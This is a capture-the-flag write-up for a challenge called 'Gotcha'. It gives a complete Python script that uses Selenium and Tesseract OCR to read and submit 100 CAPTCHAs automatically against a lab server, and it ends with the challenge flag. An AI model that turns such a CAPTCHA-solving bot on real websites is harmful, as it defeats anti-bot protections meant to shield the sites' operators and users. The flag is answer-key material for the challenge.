## Gotcha

> This challenge requires us to solve 100 CAPTCHA challenges within 2 minutes to get the flag. It is also noted that all letters are uppercase.

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Miscellaneous/Medium/Gotcha/chall.png)

> It is noted that the CAPTCHA implemented is weak and can be recognized by tools like [Tesseract-OCR](https://github.com/tesseract-ocr/tesseract) without much preprocessing needed.

> We can use [Selenium](https://pypi.org/project/selenium/), an automated web testing software, to grab the image, and the respective fields needed for submitting the captcha form.

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Miscellaneous/Medium/Gotcha/src.png)

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Miscellaneous/Medium/Gotcha/captchaform.png)

> We can then write the exploit script as follows:

```python
from PIL import Image
from io import BytesIO
import base64
import pytesseract
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys

chrome_driver_path = "C:\\chromedriver.exe"  
service = Service(chrome_driver_path)
driver = webdriver.Chrome(service=service)

# Navigate to the website
driver.get("http://34.124.157.94:5003/")

while True:
    # Get the image data from src and decode in base64
    image_element = driver.find_element(By.CLASS_NAME, "img-fluid")
    image_url = image_element.get_attribute("src")
    image_strip = image_url[23:]
    image_data = base64.b64decode(image_strip)

    # Create a PIL Image object from the decoded image data
    image = Image.open(BytesIO(image_data))

    # Perform OCR using Tesseract
    pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract'
    text = pytesseract.image_to_string(image)

    # Extra Improvements
    final = text.upper()[:4]
    print(final)

    # Submitting Result
    captcha_field = driver.find_element(By.ID, "captch_form")
    captcha_field.clear()
    captcha_field.send_keys(final)
    captcha_field.send_keys(Keys.ENTER)
```

> You can watch the exploit video [here](https://youtu.be/Tt-p2hmM6pQ)

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Miscellaneous/Medium/Gotcha/solved.png)

`grey{I_4m_hum4n_n0w_059e3995f03a783dae82580ec144ad16}`
